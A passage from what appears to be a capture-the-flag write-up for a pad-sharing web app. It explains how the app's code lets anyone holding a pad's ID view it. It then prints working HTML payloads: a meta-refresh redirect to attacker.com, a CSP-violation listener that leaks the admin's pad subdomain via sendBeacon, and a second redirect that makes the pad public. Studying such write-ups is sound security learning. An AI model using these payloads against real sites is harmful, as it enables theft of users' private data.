</span></span><span style="display:flex;"><span>        isPublic<span style="color:#ff79c6">:</span> isPublic <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">true</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">false</span>,
</span></span><span style="display:flex;"><span>        createdAt<span style="color:#ff79c6">:</span> isTemp <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>() <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">undefined</span>
</span></span><span style="display:flex;"><span>    })
</span></span><span style="display:flex;"><span>    console.log(pad)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> pad.save()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    res.cookie(<span style="color:#f1fa8c">&#39;latest&#39;</span>, {title, uniqueId<span style="color:#ff79c6">:</span> pad.uniqueId}, {
</span></span><span style="display:flex;"><span>        secure<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
</span></span><span style="display:flex;"><span>        httpOnly<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
</span></span><span style="display:flex;"><span>        sameSite<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;none&#39;</span>,
</span></span><span style="display:flex;"><span>    })
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    req.flash(<span style="color:#f1fa8c">&#39;success&#39;</span>, <span style="color:#f1fa8c">&#39;Pad created.&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)    
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>and the pad can be viewed by visiting that unique subdomain <code>unique_id.paaad.space</code> . Looking at the code for that.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>router.get(<span style="color:#f1fa8c">&#39;/&#39;</span>, ensureAuthenticated, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
</span></span><span style="display:flex;"><span>     <span style="color:#6272a4">// get id from subdomain
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">let</span> id <span style="color:#ff79c6">=</span> req.subdomains[<span style="color:#bd93f9">0</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// show the index page
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>id){
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">let</span> pads <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> Pad.find({username<span style="color:#ff79c6">:</span> req.session.username})
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.render(<span style="color:#f1fa8c">&#39;index&#39;</span>, {
</span></span><span style="display:flex;"><span>            username<span style="color:#ff79c6">:</span> req.session.username,
</span></span><span style="display:flex;"><span>            latest<span style="color:#ff79c6">:</span> req.cookies.latest,
</span></span><span style="display:flex;"><span>            pads
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#f1fa8c">/^[a-f0-9]{48}$/</span>.test(id)){
</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Invalid pÃ¤Ã¤Ã¤d id.&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// find pad with id 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">let</span> pad <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> Pad.findOne({uniqueId<span style="color:#ff79c6">:</span> id})
</span></span><span style="display:flex;"><span>    
</span></span></code></pre></div><p>here it is taking the id from <code>req.subdomains[0]</code> and fetching the pad from the database with that id . so anyone with that unique id can view the contents of the pad, since there are no checks.</p>
<h2 id="-attack-plan">ðŸ¥· Attack plan</h2>
<p>So if we can manage to somehow get the admin pads unique_id , we can access his pad. So the idea is to somehow leak this unique subdomain. There is another feature of this application that I found interesting, that allows you to view the latest note created by a user.</p>
<p>Looking at the code for that functionality.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>router.get(<span style="color:#f1fa8c">&#39;/p/latest&#39;</span>, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>req.cookies.latest){
</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;No latest pÃ¤Ã¤Ã¤d.&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> id <span style="color:#ff79c6">=</span> req.cookies.latest.uniqueId
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#f1fa8c">/^[a-f0-9]{48}$/</span>.test(id)){
</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Invalid pÃ¤Ã¤Ã¤d id.&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>Basically, if we visit the endpoint <code>/p/latest</code> with the cookie latest, it will redirect to unique_id.paaad.space. So if we manage to somehow leak the subdomain from this redirection we can get the pad.</p>
<p>The initial plan is to use csp violations to leak the subdomain. So to do that we have to first redirect the bot to our attacker&rsquo;s website. Since <code>.setHTML()</code> allows meta tags we can use a meta redirect to our attacker controlled website .</p>
<h2 id="csp-violation-leak-">CSP violation leak ðŸŒŸ</h2>
<p>If we put <code>https://xn--pd-viaaa.space/p/latest </code> in an iframe and then add a csp with   <code>frame-src https://xn--pd-viaaa.space/p/latest </code> it will trigger a csp violation , because <code>https://xn--pd-viaaa.space/p/latest </code> redirects to <code>unique_id.xn--pd-viaaa.space</code> .</p>
<p>So using this technique we can leak the unique_id .</p>
<h2 id="csrf-to-make-the-note-public-">CSRF to make the note public ðŸŒŸ</h2>
<p>After getting the unique id there is still one more problem to solve. The admins pad is not public, so we can&rsquo;t access it directly due to this check.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>pad.isPublic <span style="color:#ff79c6">&amp;&amp;</span> req.session.username <span style="color:#ff79c6">!=</span> pad.username){
</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Not allowed to access this non-public pÃ¤Ã¤Ã¤d.&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>The code to make the note public is as follows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(req.session.username <span style="color:#ff79c6">==</span> pad.username){
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(req.query.edit<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;isPublic&#39;</span>){
</span></span><span style="display:flex;"><span>            pad.isPublic <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">!</span>pad.isPublic
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">await</span> pad.save()
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(req.query.edit<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;isTemp&#39;</span>){
</span></span><span style="display:flex;"><span>            pad.createdAt <span style="color:#ff79c6">=</span> pad.createdAt <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">undefined</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>()
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">await</span> pad.save()
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>So we just have to make the admin send a get request using ?edit=isPublic to make the note public. But unfortunately, the session cookie is having <code>sameSite: 'strict'</code> . So doing a csrf to make the note public won&rsquo;t work.</p>
<p>To overcome this we can run the bot twice, the first time to leak the unique_id and the next time with a pad that has a meta redirect to <code>unique_id.xn--pd-viaaa.space?edit=isPublic</code> to make the note public.</p>
<h2 id="--final-payloads">ðŸš€  Final Payloads</h2>
<p><code>First pad</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#6272a4">&lt;!-- redirect to attacker site --&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;refresh&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1; url=https://attacker.com/attacker.html&#34;</span>&gt;
</span></span></code></pre></div><p><code>https://attacker.com/attacker.html</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">charset</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewport&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Content-Security-Policy&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;frame-src &#39;self&#39; xn--pd-viaaa.space;&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">title</span>&gt;TEST&lt;/<span style="color:#ff79c6">title</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">head</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">body</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">script</span>&gt;
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">document</span>.addEventListener(<span style="color:#f1fa8c">&#39;securitypolicyviolation&#39;</span>, <span style="color:#ff79c6">async</span> <span style="color:#8be9fd;font-style:italic">function</span> (event) {
</span></span><span style="display:flex;"><span>            console.log(event)
</span></span><span style="display:flex;"><span>            navigator.sendBeacon(location.href,event.blockedURI)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        });      
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#ff79c6">script</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">iframe</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://pÃ¤Ã¤Ã¤d.space/p/latest&#34;</span>&gt;&lt;/<span style="color:#ff79c6">iframe</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">body</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">html</span>&gt;
</span></span></code></pre></div><p><code>Second pad</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#6272a4">&lt;!-- to make pad public--&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;refresh&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1; url=unique_id.xn--pd-viaaa.space?edit=isPublic&#34;</span>&gt;
</span></span></code></pre></div><h2 id="-flag">ðŸš© Flag</h2>
<p><code>flag{hmmmmmmmmmXDD} </code></p>]]></description>
      
    </item>
    
    
  </channel>
</rss>
